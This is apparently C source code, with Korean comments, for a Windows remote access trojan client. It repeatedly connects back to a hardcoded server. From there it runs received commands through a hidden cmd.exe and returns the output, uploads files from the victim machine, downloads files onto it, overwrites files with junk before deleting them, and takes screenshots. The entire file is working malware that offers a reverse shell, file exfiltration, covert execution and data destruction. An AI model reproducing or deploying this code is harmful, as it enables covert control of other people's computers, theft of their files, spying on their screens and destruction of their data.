#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <Winsock2.h> // sockt function , socket structure, windows.h
#include <Ws2tcpip.h> // ip address search, tcp/ip protocol
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 4096
#define DEFAULT_PORT "27015"
static char *DEFAULT_SERVER = "255.255.255.255";
#define BitsPerPixel 24

int InitSocket(SOCKET *ClientSocket, char *ip){
	WSADATA wsaData; //winsock api
	
	// 1. Winsock 초기화
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { //WS2_32.dll,version 2.2 of Winsock 
		//printf("WSAStartup failed\n");
		return 1;
	}

	// 2. socket address 설정
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	if (getaddrinfo(ip, DEFAULT_PORT, &hints, &result) != 0) { //나의 dns(NULL)에 27015포트에 힌트 소켓을 넣어서
																	//struct addrinfo result주소로 바꿈
		//printf("getaddrinfo failed\n");
		WSACleanup();
		return 2;
	}

	// 3. 연결시도
	//SOCKET ConnectSocket = INVALID_SOCKET;
	int iResult;

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) { // 서버에 연결하기 위한 소켓 생성(연결리스트)
		*ClientSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (*ClientSocket == INVALID_SOCKET) {
			//printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 3;
		}

		// 4. 서버에 연결(connect)
		iResult = connect(*ClientSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ClientSocket);
			*ClientSocket = INVALID_SOCKET;
			continue;
		}
	}

	// connect 함수가 호출되면 struct addrinfo는 더 이상 사용되지 않는다
	freeaddrinfo(result);
	// connect가 제대로 안되면 WinSockApi 클린업
	if (*ClientSocket == INVALID_SOCKET) {
		//printf("Unable to connect to server!\n");
		WSACleanup();
		return 5;
	}
	return 0;
}

int Command(SOCKET *ConnectSocket, char *recvbuf, char *sendbuf) {
	WCHAR cmd[28] = L"C:\\Windows\\System32\\cmd.exe";
	WCHAR cmdArgs[DEFAULT_BUFLEN] = L"";
	char Argsinit[DEFAULT_BUFLEN] = "C:\\Windows\\System32\\cmd.exe /c ";
	strcat_s(Argsinit, sizeof(Argsinit) / sizeof(char), recvbuf);
	
	MultiByteToWideChar(CP_ACP, NULL, Argsinit, -1, cmdArgs, DEFAULT_BUFLEN);

	DWORD dwRead = 0, dwOut = 0, dwErr = 0;
	HANDLE hStdOutWrite = NULL, hStdOutRead = NULL;
	HANDLE hStdErrWrite = NULL, hStdErrRead = NULL;
	STARTUPINFOW si;
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);  // 부모 프로세스에 넘길 StdOut 
	CreatePipe(&hStdErrRead, &hStdErrWrite, &sa, 0);  // 부모 프로세스에 넘길 StdErr 

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; //showwindow 비트 켜기
	si.hStdOutput = hStdOutWrite;
	si.hStdInput = NULL;
	si.hStdError = hStdErrWrite;
	si.wShowWindow = SW_HIDE;       //showwindow 비트를 hide로 바꿈
	//ChildProcesss시작
	CreateProcessW(cmd, cmdArgs, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	//chileprocess초기화 과정부터 send까지 사라짐
	int iResult = 0;
	int iWork = 0;
	
	while ((PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &dwOut, NULL) ||
		PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &dwErr, NULL)) &&
		select(NULL, (fd_set*)ConnectSocket, NULL, NULL, NULL))  // 파이프로 데이터가 들어올 경우,소켓이 유효한 경우
	{
		if (dwOut <= 0 && dwErr <= 0 && WaitForSingleObject(pi.hProcess, 0) != WAIT_TIMEOUT)
			break;  // 부모 프로세스가 종료된 경우 끝

		while (PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &dwOut, NULL) && dwOut > 0 &&
			select(NULL, (fd_set*)ConnectSocket, NULL, NULL, NULL))
		{
			iWork = 1;
			memset(sendbuf, 0, DEFAULT_BUFLEN); ReadFile(hStdOutRead, sendbuf, DEFAULT_BUFLEN, &dwRead, NULL);
			sendbuf[dwRead] = 0;
			//iResult = send(*ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);//send
			Sleep(10); iResult = send(*ConnectSocket, sendbuf, DEFAULT_BUFLEN, 0);//send
			if (iResult == SOCKET_ERROR) {
				closesocket(*ConnectSocket);
				WSACleanup();
				return 1;
			}
		}

		while (PeekNamedPipe(hStdErrRead, NULL, 0, NULL, &dwErr, NULL) && dwErr > 0 &&
			select(NULL, (fd_set*)ConnectSocket, NULL, NULL, NULL))
		{
			iWork = 1;
			memset(sendbuf, 0, DEFAULT_BUFLEN); ReadFile(hStdErrRead, sendbuf, DEFAULT_BUFLEN, &dwRead, NULL);
			sendbuf[dwRead] = 0;
			//iResult = send(*ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);//send
			Sleep(10); iResult = send(*ConnectSocket, sendbuf, DEFAULT_BUFLEN, 0);//send
			if (iResult == SOCKET_ERROR) {
				closesocket(*ConnectSocket);
				WSACleanup();
				return 1;
			}
		}

	}

	CloseHandle(pi.hProcess);
	CloseHandle(hStdOutRead);
	CloseHandle(hStdOutWrite);
	CloseHandle(hStdErrRead);
	CloseHandle(hStdErrWrite);

	if (iWork == 0)
		iResult = send(*ConnectSocket, "This command has no output~\n", 29, 0);//state
	return 0;
}

int Send_File(SOCKET *ConnectSocket,char *recvbuf, char *sendbuf) {
	char data[DEFAULT_BUFLEN] = "";
	strcpy_s(data, DEFAULT_BUFLEN, recvbuf + 4);
	
	if (data[strlen(data) - 1] == '\n')
		data[strlen(data) - 1] = '\0';
	int iResult = 0;

	// filename assemble
	//char* pPath = new char[DEFAULT_BUFLEN];
	//GetModuleFileNameA(0, pPath, DEFAULT_BUFLEN);
	//pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	//strcat_s(pPath, strlen(pPath)+strlen(ptr)+1 , ptr);

	// file open
	FILE *fget;
	int err;
	err = fopen_s(&fget, data, "rb");
	// file open error send
	if (err != 0) {
		//sprintf_s(sendbuf, DEFAULT_BUFLEN, "file %s does not found.\n", pPath);
		sprintf_s(sendbuf, DEFAULT_BUFLEN, "file %s does not found.\n", data);
		iResult = send(*ConnectSocket, sendbuf, (int)strlen(sendbuf), 0); Sleep(100);//error send
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}
		return 1;
	}
	else {
		iResult = send(*ConnectSocket, "success", 7, 0); Sleep(100);//success send
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}
	}

	// server status recv
	iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}
	if (!strncmp(recvbuf, "fail", 4)) return 1;
	//else if(!strncmp(recvbuf, "success", 7))

	// client file size send
	_fseeki64(fget,0,SEEK_END);
	long long num;
	if(_ftelli64(fget) < DEFAULT_BUFLEN || _ftelli64(fget) % DEFAULT_BUFLEN != 0)
		num = _ftelli64(fget) / DEFAULT_BUFLEN + 1;
	else num = _ftelli64(fget) / DEFAULT_BUFLEN;
	_fseeki64(fget, 0, SEEK_SET);
	sprintf_s(sendbuf, DEFAULT_BUFLEN,"%lld", num);
	iResult = send(*ConnectSocket, sendbuf, DEFAULT_BUFLEN, 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}

	// client file send
	char buf[DEFAULT_BUFLEN] = { '\0', };
	while ( num > 0) {
		Sleep(1);
		fread(buf, sizeof(char), DEFAULT_BUFLEN, fget);

		iResult = send(*ConnectSocket, buf, DEFAULT_BUFLEN, 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}

		iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}

		num--;
	}
	fclose(fget);

	// end
	sprintf_s(sendbuf, DEFAULT_BUFLEN, "sefskdn");//send end file soc ket dow n
	iResult = send(*ConnectSocket, sendbuf, DEFAULT_BUFLEN, 0); Sleep(100);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}
	memset(recvbuf, 0, DEFAULT_BUFLEN);
	memset(sendbuf, 0, DEFAULT_BUFLEN);
	//printf("get end\n");
	return 0;
}

int Get_File(SOCKET *ConnectSocket, char *recvbuf, char *sendbuf) {
	char data[DEFAULT_BUFLEN] = "";
	strcpy_s(data, DEFAULT_BUFLEN, recvbuf+4);
	if (data[strlen(data) - 1] == '\n')
		data[strlen(data) - 1] = '\0';
	//char* pPath = new char[DEFAULT_BUFLEN];
	//GetModuleFileNameA(0, pPath, DEFAULT_BUFLEN);
	//pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	//if (strrchr(ptr, '\\') != NULL) ptr = strrchr(ptr, '\\') + 1;
	//strcat_s(pPath, strlen(pPath) + strlen(ptr) + 1, ptr);

	int iResult = 0;
	iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
	if (!strncmp(recvbuf, "file", 4)){//none-file(file does not found) error received
		return 1;
	}
	//else if (!strncmp(recvbuf, "start", 5)) {
	FILE *fget;
	int err;

	err = fopen_s(&fget, data, "wb");
	if (err != 0) {
		iResult = send(*ConnectSocket, "error", 5, 0); Sleep(100);
		return 1;
	}
	else {
		iResult = send(*ConnectSocket, "success", 7, 0); Sleep(100);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}
	}

	// file size recv
	memset(recvbuf, 0, DEFAULT_BUFLEN);
	long long num;
	iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(*ConnectSocket);
		WSACleanup();
		return 1;
	}
	num = atoll(recvbuf) + 1;

	/*get file*/
	while ( num > 0) {
		iResult = recv(*ConnectSocket, recvbuf, DEFAULT_BUFLEN, 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(*ConnectSocket);
			WSACleanup();
			return 1;
		}
		else if (!strncmp(recvbuf, "sefskdn", 7)) break;
		else {
			fwrite(recvbuf, sizeof(char), DEFAULT_BUFLEN, fget);
			num--;
			iResult = send(*ConnectSocket, "success", 7, 0);
			if (iResult == SOCKET_ERROR) {
				closesocket(*ConnectSocket);
				WSACleanup();
				return 1;
			}
		}
	}

	// end
	fclose(fget);
	memset(recvbuf, 0, DEFAULT_BUFLEN);
	return 0;
}

int Perfect_Remove(SOCKET *ConnectSocket, char *recvbuf, char *sendbuf) {
	char data[DEFAULT_BUFLEN] = "";
	strcpy_s(data, DEFAULT_BUFLEN, recvbuf + 7);

	if (data[strlen(data) - 1] == '\n')
		data[strlen(data) - 1] = '\0';

	char remove[1024] = "asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf \
						 asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfaaa";

	//char* pPath = (char *)malloc(sizeof(char) * 1024);
	//GetModuleFileNameA(0, pPath, 1024);
	//pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	//strcat_s(pPath, strlen(pPath) + strlen(ptr) + 1, ptr);

	int err;
	FILE *file;
	//err = fopen_s(&file, pPath, "r+b");
	err = fopen_s(&file, data, "r+b");
	if (err != 0) {
		return 1;
	}

	long long fsize = 0;
	_fseeki64(file, 0, SEEK_END);
	fsize = _ftelli64(file);
	_fseeki64(file, 0, SEEK_SET);
	long long count = fsize / 1024 + 1;
	while (count > 0) {
		fwrite(remove, sizeof(char), 1024, file);
		count--;
	}
	fclose(file);
	char erase[1024] = "erase ";
	strcat_s(erase, strlen(erase) + strlen(data) + 1, data);
	system(erase);

	return 0;
}

int Capture() {
	//HWND hWnd = GetConsoleWindow(); // 현재 열린 창의 핸들 가져오기
	//ShowWindow(hWnd, SW_HIDE); // 현재 열린창을 hide
	//Sleep(300); //to wait while hide console application

	int x1, y1, x2, y2, w, h;

	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN); // 왼쪽끝
	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN); // 위쪽끝
	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);// 가로폭
	y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);// 세로폭

	w = x2 - x1;
	h = y2 - y1;

	BITMAPINFO Info;
	BITMAPFILEHEADER Header;
	memset(&Info, 0, sizeof(Info));
	memset(&Header, 0, sizeof(Header));
	Info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	Info.bmiHeader.biWidth = w;
	Info.bmiHeader.biHeight = h;
	Info.bmiHeader.biPlanes = 1;
	Info.bmiHeader.biBitCount = 24;
	Info.bmiHeader.biCompression = BI_RGB;
	Info.bmiHeader.biSizeImage = w * h * (BitsPerPixel > 24 ? 4 : 3);
	Header.bfType = 0x4D42;
	Header.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	char *pixels = NULL;


	HDC hScreen = GetDC(NULL); // DC = Device Context, HDC = Handle DC, 전체 스크린(NULL)에 대한 DC 핸들을 가져옴

							   //전체화면과 동일한 설정의 메모리DC(hDC)에 오브젝트(hBitmap)설정하는 과정
	HDC hDC = CreateCompatibleDC(hScreen); // 핸들과 동일한 메모리DC를 생성
										   //HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h); // 전체 스크린 DC와 호환되는 비트맵(가로w,세로h) 생성
										   //HGDIOBJ old_obj = SelectObject(hDC, hBitmap); // 메모리DC에 들어갈 오브젝트(hBitmap,전체스크린과 동일한 크기) 설정
	HBITMAP Section = CreateDIBSection(hScreen, &Info, DIB_RGB_COLORS, (void**)&pixels, 0, 0);//DIB(장치 독립 비트맵)설정
	SelectObject(hDC, Section);

	// 메모리DC(Section)에 전체화면(hScreen)을 복사,전체화면 크기 그대로(srccopy) 
	BOOL bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
	DeleteDC(hDC);

	time_t timer;
	time(&timer);
	char fname[32];
	sprintf_s(fname, 32, "screenshot_%lld.png", timer);
	FILE *shot;
	if (fopen_s(&shot, fname, "wb") != 0) {
		DeleteObject(Section);
		return 1;
	}
	else {
		fwrite((char*)&Header, 1, sizeof(Header), shot);
		fwrite((char*)&Info.bmiHeader, 1, sizeof(Info.bmiHeader), shot);
		fwrite(pixels, 1, (((BitsPerPixel * w + 31) & ~31) / 8) * h, shot);
		fclose(shot);
		DeleteObject(Section);
	}

	/*
	OpenClipboard(NULL);//이미 열려있는(NULL) 클립보드를 연결
	EmptyClipboard();
	SetClipboardData(CF_BITMAP, hBitmap); //표준클립보드포맷(CF_BITMAP,비트맵핸들), 메모리DC의 오브젝트에 대한 핸들

	CloseClipboard();
	*/
	//CloseHandle(hWnd);
	return 0;
}

int __cdecl main(int argc, char **argv)
{
	 // Validate the parameters
	/*if (argc != 2) {
		printf("usage: %s server-name\n", argv[0]);
		return 1;
	}*/
	//HWND hWnd = GetConsoleWindow(); // 현재 열린 창의 핸들 가져오기
	//ShowWindow(hWnd, SW_HIDE); // 현재 열린창을 hide

	SOCKET ConnectSocket = INVALID_SOCKET;
	while (InitSocket(&ConnectSocket, DEFAULT_SERVER) != 0) {
		continue;
	}

	// Receive until the peer closes the connection
	char recvbuf[DEFAULT_BUFLEN] = "";
	int recvbuflen = DEFAULT_BUFLEN;
	char sendbuf[DEFAULT_BUFLEN] = "";
	int sendbuflen = DEFAULT_BUFLEN;
	int iReceiveResult;
	int iResult;

	// Create Child Process & 통신
	do {
		memset(recvbuf, 0, DEFAULT_BUFLEN);
		if (!select(NULL, (fd_set*)ConnectSocket, NULL, NULL, NULL)) break;
		iReceiveResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iReceiveResult > 0) {
			if (strlen(recvbuf) > 0 && recvbuf[strlen(recvbuf) - 1] == '\n')
				recvbuf[strlen(recvbuf) - 1] = '\0';

			//Execute
			if (!strncmp(recvbuf, "get", 3))
				iResult = Send_File(&ConnectSocket, recvbuf, sendbuf);// strchr(recvbuf, 't') + 2
			else if (!strncmp(recvbuf, "put", 3))
				iResult = Get_File(&ConnectSocket, recvbuf, sendbuf);
			else if (!strncmp(recvbuf, "remove", 6)) {
				iResult = Perfect_Remove(&ConnectSocket, recvbuf, sendbuf);
				if (iResult == 0) {
					iResult = send(ConnectSocket, "remove completed\n", 18, 0);
					Sleep(100);
					if (iResult == SOCKET_ERROR) {
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}
				}
				else {
					iResult = send(ConnectSocket, "remove failed\n", 15, 0);;
					Sleep(100);
					if (iResult == SOCKET_ERROR) {
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}
				}
			}
			else if (!strncmp(recvbuf, "screenshot", 10)) {
				iResult = Capture();
				if (iResult == 0) {
					iResult = send(ConnectSocket, "capture completed\n", 19, 0);
					Sleep(100);
					if (iResult == SOCKET_ERROR) {
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}
				}
				else {
					iResult = send(ConnectSocket, "capture failed\n", 16, 0);
					Sleep(100);
					if (iResult == SOCKET_ERROR) {
						closesocket(ConnectSocket);
						WSACleanup();
						return 1;
					}
				}
			}
			else
				iResult = Command(&ConnectSocket, recvbuf, sendbuf);

			//Epilogue
			Sleep(100);
			iResult = send( ConnectSocket, "end", 3, 0 );//epilogue
			if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			WSACleanup();
			return 1;
			}
		}
	} while (select(NULL, (fd_set*)ConnectSocket, NULL, NULL, NULL));

	// cleanup
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}